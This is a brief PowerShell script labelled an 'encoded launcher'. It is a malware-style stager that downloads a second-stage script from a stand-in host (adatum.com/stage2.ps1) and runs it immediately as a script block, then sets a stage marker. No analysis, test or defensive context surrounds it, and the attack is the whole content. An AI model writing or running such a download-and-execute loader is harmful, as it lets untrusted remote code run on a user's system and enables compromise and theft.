
# Encoded launcher
$PayloadText = (New-Object Net.WebClient).DownloadString('https://adatum.com/stage2.ps1')
& ([ScriptBlock]::Create($PayloadText))
$StageMarker = "stage-19"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
